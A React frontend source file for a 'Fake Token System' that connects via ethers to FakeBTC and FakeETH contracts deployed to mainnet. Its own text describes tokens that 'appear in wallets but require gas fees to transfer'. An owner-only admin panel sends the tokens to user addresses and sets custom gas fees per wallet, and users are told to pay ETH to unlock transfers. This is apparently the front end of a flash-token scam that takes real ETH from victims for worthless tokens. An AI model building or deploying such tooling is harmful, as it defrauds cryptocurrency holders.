import React, { useEffect, useState } from 'react';
import { ethers } from 'ethers';
import { useWeb3Store, useTokenStore, useSettingsStore } from './stores/index';
import { fetchCryptoPrices } from './utils/coingecko';
import { FLASH_TOKEN_ABI } from './abis/index';
import WalletConnect from './components/WalletConnect';
import SettingsPanel from './components/SettingsPanel';
import AdminPanel from './components/AdminPanel';
import BalanceCard from './components/BalanceCard';
import GasPaymentCard from './components/GasPaymentCard';
import TokenTransferCard from './components/TokenTransferCard';
import './App.css';

// Default contract addresses
const FAKE_BTC_ADDRESS = import.meta.env.VITE_FAKE_BTC_ADDRESS || '';
const FAKE_ETH_ADDRESS = import.meta.env.VITE_FAKE_ETH_ADDRESS || '';

export function App() {
  const { account, provider, signer, isConnected } = useWeb3Store();
  const { selectedToken, updateTokenBalance, updateGasBalance, updatePrices, tokenAddresses } = useTokenStore();
  const { autoRefresh, refreshInterval } = useSettingsStore();

  const [network, setNetwork] = useState(null);
  const [contracts, setContracts] = useState({ BTC: null, ETH: null });
  const [isInitialized, setIsInitialized] = useState(false);

  // Set contract addresses in store
  useEffect(() => {
    if (FAKE_BTC_ADDRESS && FAKE_ETH_ADDRESS) {
      updateTokenBalance('BTC', '0');
      updateTokenBalance('ETH', '0');
    }
  }, []);

  // Initialize contracts
  useEffect(() => {
    // Check if addresses are valid (not placeholders or empty)
    const isValidAddress = (addr) => {
      return addr && addr.startsWith('0x') && addr.length === 42 && addr !== '0x...';
    };

    if (!signer || !isValidAddress(FAKE_BTC_ADDRESS) || !isValidAddress(FAKE_ETH_ADDRESS)) {
      setContracts({ BTC: null, ETH: null });
      if (FAKE_BTC_ADDRESS === '0x...' || FAKE_ETH_ADDRESS === '0x...') {
        console.log('⚠️ Contract addresses not configured. Update VITE_FAKE_BTC_ADDRESS and VITE_FAKE_ETH_ADDRESS in frontend/.env');
      }
      return;
    }

    try {
      const btcContract = new ethers.Contract(FAKE_BTC_ADDRESS, FLASH_TOKEN_ABI, signer);
      const ethContract = new ethers.Contract(FAKE_ETH_ADDRESS, FLASH_TOKEN_ABI, signer);
      setContracts({ BTC: btcContract, ETH: ethContract });
      console.log('✅ Contracts initialized:', { BTC: FAKE_BTC_ADDRESS, ETH: FAKE_ETH_ADDRESS });
    } catch (error) {
      console.error('Failed to initialize contracts:', error);
    }
  }, [signer, FAKE_BTC_ADDRESS, FAKE_ETH_ADDRESS]);

  // Load token balances
  useEffect(() => {
    // Handle demo mode
    if (account?.includes("DEMO")) {
      console.log("📱 Demo mode - skipping balance loading");
      setIsInitialized(true);
      return;
    }

    // Check if contracts are initialized
    if (!account || !isConnected || !contracts.BTC || !contracts.ETH) {
      setIsInitialized(false);
      return;
    }

    const loadBalances = async () => {
      try {
        console.log('📊 Loading balances for', account);
        console.log('📝 BTC Contract:', contracts.BTC?.address || 'NOT INITIALIZED');
        console.log('📝 ETH Contract:', contracts.ETH?.address || 'NOT INITIALIZED');
        
        const [btcBalance, btcGasBalance, ethBalance, ethGasBalance] = await Promise.all([
          contracts.BTC.balanceOf(account),
          contracts.BTC.gasBalance(account),
          contracts.ETH.balanceOf(account),
          contracts.ETH.gasBalance(account),
        ]);

        // Format balances (BTC has 8 decimals, ETH has 18)
        const btcFormatted = ethers.formatUnits(btcBalance, 8);
        const ethFormatted = ethers.formatUnits(ethBalance, 18);

        console.log('✅ Raw balances:', { btcBalance: btcBalance.toString(), ethBalance: ethBalance.toString() });
        console.log('✅ Formatted Balances:', { BTC: btcFormatted, ETH: ethFormatted });

        updateTokenBalance('BTC', btcFormatted);
        updateTokenBalance('ETH', ethFormatted);
        updateGasBalance('BTC', btcGasBalance.toString());
        updateGasBalance('ETH', ethGasBalance.toString());

        setIsInitialized(true);
      } catch (error) {
        console.error('❌ Error loading balances:', error);
        console.error('❌ Error details:', { message: error.message, code: error.code, data: error.data });
        // Still initialize to show UI, but balances will be 0
        setIsInitialized(true);
      }
    };

    loadBalances();

    // Auto-refresh balances
    if (autoRefresh) {
      const interval = setInterval(loadBalances, refreshInterval);
      return () => clearInterval(interval);
    }
  }, [account, isConnected, contracts, autoRefresh, refreshInterval]);

  // Fetch cryptocurrency prices
  useEffect(() => {
    const loadPrices = async () => {
      const prices = await fetchCryptoPrices('bitcoin,ethereum', 'usd');
      updatePrices(prices);
    };

    loadPrices();

    // Refresh prices every 30 seconds
    const interval = setInterval(loadPrices, 30000);
    return () => clearInterval(interval);
  }, []);

  // Get network info
  useEffect(() => {
    if (!provider) return;

    const getNetwork = async () => {
      const net = await provider.getNetwork();
      setNetwork({
        name: net.name,
        chainId: net.chainId,
      });
    };

    getNetwork();
  }, [provider]);

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-900 via-gray-800 to-black">
      <div className="container mx-auto px-4 py-8">
        {/* Header */}
        <div className="flex justify-between items-start mb-12">
          <div>
            <div className="flex items-center gap-3 mb-4">
              <span className="text-5xl">💰</span>
              <h1 className="text-4xl md:text-5xl font-bold text-transparent bg-clip-text bg-gradient-to-r from-blue-400 to-purple-500">
                Fake Token System
              </h1>
            </div>
            <p className="text-gray-300 text-lg">
              Send BTC or ETH fake tokens that appear in wallets but require gas fees to transfer
            </p>

            {network && (
              <div className="mt-4 inline-block bg-gray-800 border border-gray-700 rounded-full px-4 py-2 text-sm text-gray-300">
                🌐 {network.name} (Chain ID: {network.chainId})
              </div>
            )}
          </div>

          {/* Settings Button */}
          <div className="flex gap-3">
            <SettingsPanel />
          </div>
        </div>

        {/* Main Content */}
        <div className="max-w-6xl mx-auto">
          {/* Wallet Connection */}
          <div className="mb-8">
            <WalletConnect />
          </div>

          {isConnected && isInitialized ? (
            <>
              {/* Contract Address Warning */}
              {(!FAKE_BTC_ADDRESS || !FAKE_ETH_ADDRESS || FAKE_BTC_ADDRESS === '0x...' || FAKE_ETH_ADDRESS === '0x...') && (
                <div className="mb-8 bg-red-900/20 border border-red-500 rounded-lg p-4 text-red-300">
                  <p className="font-semibold mb-2">⚠️ Contracts Not Deployed</p>
                  <p className="text-sm mb-3">
                    Contract addresses are not configured. You need to:
                  </p>
                  <ol className="text-sm list-decimal list-inside space-y-1">
                    <li>Deploy FakeBTC and FakeETH contracts to mainnet</li>
                    <li>Copy the contract addresses from deployment output</li>
                    <li>Update <code className="bg-black/30 px-2 py-1 rounded">VITE_FAKE_BTC_ADDRESS</code> and <code className="bg-black/30 px-2 py-1 rounded">VITE_FAKE_ETH_ADDRESS</code> in <code className="bg-black/30 px-2 py-1 rounded">frontend/.env</code></li>
                    <li>Restart the development server</li>
                  </ol>
                </div>
              )}

              {/* Current Token Indicator */}
              <div className="mb-6 p-4 bg-gradient-to-r from-blue-900 to-purple-900 border border-purple-700 rounded-lg">
                <p className="text-sm text-gray-300">
                  Currently Working With: <span className="text-2xl font-bold text-white">{selectedToken}</span>
                </p>
              </div>

              {/* Balances */}
              <div className="mb-8">
                <BalanceCard />
              </div>

              {/* Admin Panel - Send tokens to wallets (owner only) */}
              <AdminPanel />

              {/* Action Cards */}
              <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
                <GasPaymentCard />
                <TokenTransferCard />
              </div>

              {/* Info Section */}
              <div className="mt-8 bg-gray-800 border border-gray-700 rounded-lg p-6">
                <h3 className="text-lg font-semibold text-gray-200 mb-4">ℹ️ How It Works</h3>
                <div className="space-y-3 text-gray-300 text-sm">
                  <div className="flex gap-3">
                    <span className="text-blue-400 font-bold">1.</span>
                    <p>Select a token (BTC or ETH) from settings</p>
                  </div>
                  <div className="flex gap-3">
                    <span className="text-blue-400 font-bold">2.</span>
                    <p>View your fake token balance in the Balance Card</p>
                  </div>
                  <div className="flex gap-3">
                    <span className="text-blue-400 font-bold">3.</span>
                    <p>Pay gas fee in ETH to enable transfers</p>
                  </div>
                  <div className="flex gap-3">
                    <span className="text-blue-400 font-bold">4.</span>
                    <p>Send tokens to any Ethereum address - gas fee is deducted on transfer</p>
                  </div>
                </div>
              </div>
            </>
          ) : isConnected ? (
            <div className="text-center py-12 bg-gray-800 border border-gray-700 rounded-lg">
              <span className="text-4xl mb-4 block animate-spin">⏳</span>
              <h2 className="text-2xl font-semibold text-gray-200 mb-2">Loading...</h2>
              <p className="text-gray-400">Initializing tokens...</p>
            </div>
          ) : (
            <div className="text-center py-12 bg-gray-800 border border-gray-700 rounded-lg">
              <span className="text-4xl mb-4 block">👛</span>
              <h2 className="text-2xl font-semibold text-gray-200 mb-2">Connect Your Wallet</h2>
              <p className="text-gray-400 mb-4">
                Connect your Web3 wallet to manage tokens and gas fees
              </p>
              <p className="text-gray-500 text-sm max-w-md mx-auto">
                👑 Admin? Send BTC/ETH tokens to user addresses and set custom gas fees per wallet<br/>
                👤 User? Check balance, pay gas fees, and transfer tokens
              </p>
            </div>
          )}
        </div>

        {/* Footer */}
        <div className="mt-16 text-center text-gray-500 text-xs border-t border-gray-700 pt-8">
          <p>Fake Token System v2.0 | BTC & ETH Support | Powered by Mainnet</p>
        </div>
      </div>
    </div>
  );
}

export default App;
